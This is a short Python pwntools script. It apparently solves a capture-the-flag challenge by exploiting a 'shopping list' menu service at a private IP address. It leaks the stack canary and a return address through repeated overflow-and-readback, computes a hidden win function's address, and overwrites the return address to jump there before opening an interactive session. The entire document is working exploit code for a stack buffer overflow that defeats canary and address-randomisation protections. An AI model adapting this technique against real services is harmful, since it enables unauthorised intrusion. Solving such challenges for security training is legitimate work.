from pwn import p64, remote, u64


P = remote("10.212.173.64", 32_183)


def menu_choice(choice: int) -> None:
    print(P.recvuntil(b"Enter a choice (1-3): ").decode())
    P.sendline(str(choice).encode())


def add_item(item: bytes) -> None:
    menu_choice(1)

    print(P.recvuntil(b"Please send in how many bytes you wish to write to the shopping list: ").decode())
    P.sendline(str(len(item)).encode())

    print(P.recvuntil(b"Please send in your data:").decode())
    P.send(item)


def recv_items() -> bytes:
    menu_choice(2)

    print(P.recvuntil(b"This is the current shopping list:").decode())
    P.recvline()
    print()

    line = P.recvline()
    print(line)
    return line


def main() -> None:
    offset = 59 * 4 + 8
    a_block = b"A" * offset
    temp_a_block = b"A" * (offset + 1)

    payload = temp_a_block

    add_item(payload)
    line = recv_items()

    start_idx = len(payload)
    canary_addr = b"\x00" + line.strip()[start_idx : start_idx + 7]

    if len(canary_addr) < 8:
        raise ValueError("Canary address contained a null byte")

    print(f"{canary_addr = } = {hex(u64(canary_addr))}")

    offset2 = 8
    b_block = b"B" * offset2
    temp_b_block = b"B" * (offset2 + 7)

    payload += temp_b_block

    add_item(payload)
    line = recv_items()

    start_idx = len(payload)
    ret_addr = line.strip()[start_idx : start_idx + 8].ljust(8, b"\x00")
    print(f"{ret_addr = } = {hex(u64(ret_addr))}")

    win_offset = 0x168F - 0x120C
    win_addr = u64(ret_addr) - win_offset
    print(f"{win_addr = } = {hex(win_addr)}")

    payload = a_block
    payload += canary_addr
    payload += b_block
    payload += p64(win_addr)

    add_item(payload)
    menu_choice(3)

    print(P.recvall().decode())

    P.interactive()


if __name__ == "__main__":
    main()
